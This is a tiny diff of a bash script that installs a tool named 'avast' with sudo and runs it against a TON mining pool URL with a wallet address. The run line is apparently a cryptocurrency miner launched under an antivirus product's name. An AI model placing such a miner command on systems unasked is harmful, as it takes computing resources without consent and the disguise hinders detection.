@@ -4,6 +4,6 @@
 
 #!/bin/bash
 
-sudo ph add avast miner-linux
+sudo ph add avast
 
-./avast https://next.ton-pool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
+./avast run https://ton-pool-server-p3agi.ondigitalocean.app EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
